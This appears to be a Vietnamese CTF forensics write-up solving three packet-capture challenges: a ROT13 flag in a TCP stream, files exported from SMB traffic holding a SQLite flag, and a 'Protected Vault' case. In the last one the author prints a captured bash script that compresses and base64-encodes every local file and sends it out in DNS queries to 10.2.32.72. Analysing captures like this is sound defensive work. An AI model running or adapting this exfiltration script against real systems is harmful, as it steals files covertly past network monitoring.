# Forensic 

## Netlab Warmup

![image](https://hackmd.io/_uploads/rJdr59eRT.png)

- Follow TCP thấy người dùng tải xuống file flag.txt

![image](https://hackmd.io/_uploads/BkoX5qxAT.png)

![image](https://hackmd.io/_uploads/BkT7i9gRp.png)


![image](https://hackmd.io/_uploads/S1Ogi9gCa.png)

- Rot13 để lấy flag

![image](https://hackmd.io/_uploads/HkPg35lAp.png)


## NetLab1: Sharing
- Đầu tiên mình chọn File->Export Object ->SMB thì có 2 file là netlab1.7z và password.txt

![image](https://hackmd.io/_uploads/SJvC-EbCa.png)

- Trong danh sách trên có 2 file nghi vấn là password.txt và netlab1.7z. Thực hiện tải 2 file về và mở file.

nội dung file password **SMBprotocol**
 - dùng password trong file password để unzip cái file netlab đó thì thu được file netlab1.db

db có table flag và đây là CSDL SQLite

![image](https://hackmd.io/_uploads/Bynlr4WAa.png)

Sau đó truy vấn sqlite trong bảng flag  mình tìm được dòng chữ flag trong cột BillingCity 

![image](https://hackmd.io/_uploads/H11i8EZAa.png)

hoặc mình có thể dùng https://inloop.github.io/sqlite-viewer/ để query database online

![image](https://hackmd.io/_uploads/B1Fat4bRT.png)

## NetLab2: Protected Vault

- mở phân tích gói tin mình được 

![image](https://hackmd.io/_uploads/SJkK2VbA6.png)

thấy TCP bị Warning mình follow TCP và được 

![image](https://hackmd.io/_uploads/H1Vn2VbRT.png)

- người dùng đã gửi HTTP request GET đến ```/update.sh```

![image](https://hackmd.io/_uploads/HyL_TE-0T.png)


![image](https://hackmd.io/_uploads/Sy_FaEZAT.png)

- và server trả về nội dung file update.sh

```bash!
for f in $(ls .); do
    s=4
    b=50
    c=0
    for r in $(
        for i in $(gzip -c $f | base64 -w0 | sed "s/.\{$b\}/&\n/g"); do
            if [[ "$c" -lt "$s" ]]; then
                echo -ne "$i-."
                c=$(($c+1))
            else
                echo -ne "\n$i-."
                c=1
            fi
        done
    ); do
        dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f | base58) | tr "+" "}" | tr "/" "{"` +short
    done
done
```

- Vòng lặp for đầu tiên lặp qua tất cả các tệp trong thư mục hiện tại bằng cách sử dụng lệnh ls .. Mỗi tệp được lặp qua được gán cho biến f.
- Đặt các giá trị ban đầu cho các biến: s=4, b=50, c=0.
- Vòng lặp lồng nhau thứ hai thực hiện các bước sau:

    1. Sử dụng lệnh gzip -c $f để nén tệp f, sau đó sử dụng base64 -w0 để mã hóa nén này thành chuỗi base64 không ngắt dòng.
    2. Sử dụng sed để chia chuỗi base64 thành các phần có độ dài bằng b (50) ký tự. Mỗi phần được in trên một dòng.
    3. Trong vòng lặp này, mỗi phần được in ra với một dấu gạch ngang cuối dòng. Nếu số lượng dấu gạch ngang cuối dòng là ít hơn s (4), một dấu gạch ngang mới sẽ được thêm vào. Nếu không, một dòng mới sẽ được bắt đầu.

- Đoạn mã bên trong vòng lặp lồng nhau thực hiện các bước sau:
 Sử dụng lệnh dig để thực hiện một truy vấn DNS đến máy chủ DNS ở địa chỉ IP 10.2.32.72. Chuỗi truy vấn được tạo bằng cách thêm một phần của chuỗi base64 đã được chia nhỏ vào tên tệp (f) sau đó mã hóa tên tệp bằng base58. Trong quá trình này, ký tự "+" được thay thế bằng "}", và ký tự "/" được thay thế bằng "{".



thấy gói tin DNS xuất hiện khá nhiều và có thông tin lạ như bị mã hóa như chúng ta đã phân tích 

![image](https://hackmd.io/_uploads/S1jyJB-06.png)

vậy  nội dung từ các file trong hệ thống đã được mã hóa và chuyền tin thông qua DNS